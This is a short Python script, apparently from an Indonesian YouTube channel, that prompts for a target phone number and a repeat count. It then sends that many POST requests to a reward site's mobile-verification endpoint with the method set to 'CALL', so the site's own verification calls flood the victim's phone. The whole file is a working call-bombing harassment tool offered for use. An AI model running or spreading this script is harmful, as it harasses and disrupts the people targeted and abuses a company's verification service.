import os,sys,time,requests

banner= """
╔══╗╔═╗╔══╗╔═╦═╗╔═╗╔══╗╔╗─╔╗
║══╣║╬║║╔╗║║║║║║║╔╝║╔╗║║║─║║
╠══║║╔╝║╠╣║║║║║║║╚╗║╠╣║║╚╗║╚╗
╚══╝╚╝─╚╝╚╝╚╩═╩╝╚═╝╚╝╚╝╚═╝╚═╝
╒═════════════════════════
 Youtube : TRIO CHANNEL
 Author  : TRIO CHANNEL
 \033[1;90m JANGAN LUPA SUBCRIBE•LIKE•COMENT
╘══════════════════════════"""
os.system("clear")
print(banner)
print(" Masukan No Target contoh 888xx")
nomor = input(" Nomor Target = ")
jumlah = int(input(" Total Spam = "))

url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}

for i in range(jumlah):
    send = requests.post(url+nomor, headers=ua, data=dat)
    print(" \033[1;90m[\033[1;92m•\033[1;90m] \033[1;96mStatus \033[1;90m~\033[1;96m+\033[1;92m> \033[1;95m",(send.json()["message"]))
